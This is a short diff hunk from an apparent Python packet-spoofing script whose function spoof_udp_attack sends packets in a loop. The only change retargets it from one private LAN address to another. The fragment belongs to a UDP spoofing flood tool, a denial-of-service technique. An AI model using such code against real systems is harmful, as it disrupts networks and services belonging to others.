@@ -29,6 +29,6 @@ def spoof_udp_attack(ip):
 		send(packet)
 		print(src + "attacks from port " + str(sport) +" to " + str(dport))
 
-spoof_udp_attack("192.168.0.103")
+spoof_udp_attack("192.168.0.105")
 
 
